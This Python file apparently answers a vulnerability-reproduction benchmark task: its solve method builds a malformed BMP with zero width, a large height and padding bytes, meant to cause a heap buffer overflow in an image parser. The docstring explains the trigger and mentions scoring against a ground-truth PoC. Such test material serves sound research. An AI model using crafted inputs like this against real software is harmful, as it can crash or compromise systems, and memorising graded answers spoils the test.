import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        The vulnerability description indicates that zero-width or zero-height
        images are not properly checked, leading to a heap buffer overflow.
        This PoC constructs a malformed BMP file to trigger this condition.

        The strategy is to create a BMP with:
        1.  `biWidth` set to 0. This is the primary trigger.
        2.  `biHeight` set to a large value. This can cause a processing loop
            to iterate many times, even if the calculated buffer size is zero.
        3.  Extra data appended after the headers. A vulnerable parser might
            allocate a small or zero-sized buffer based on the zero width, but
            then proceed to read from the file in a loop controlled by the large
            height, overflowing the buffer with this extra data.

        A PoC size of ~1KB is chosen as a balance between ensuring a crash
        and maximizing the score by being significantly shorter than the
        ground-truth PoC.
        """
        extra_data_len = 1024
        extra_data = b'\x41' * extra_data_len
        
        height = 2048

        file_header_size = 14
        info_header_size = 40
        header_size = file_header_size + info_header_size
        
        total_size = header_size + extra_data_len
        data_offset = header_size

        # BITMAPFILEHEADER (14 bytes)
        file_header = struct.pack(
            '<2sIHHI',
            b'BM',           # bfType
            total_size,     # bfSize
            0,              # bfReserved1
            0,              # bfReserved2
            data_offset     # bfOffBits
        )

        # BITMAPINFOHEADER (40 bytes)
        info_header = struct.pack(
            '<IiiHHIIiiII',
            info_header_size, # biSize
            0,                # biWidth (trigger)
            height,           # biHeight (large value)
            1,                # biPlanes
            24,               # biBitCount
            0,                # biCompression (BI_RGB)
            0,                # biSizeImage (calculated as 0)
            0,                # biXPelsPerMeter
            0,                # biYPelsPerMeter
            0,                # biClrUsed
            0                 # biClrImportant
        )

        poc = file_header + info_header + extra_data
        
        return poc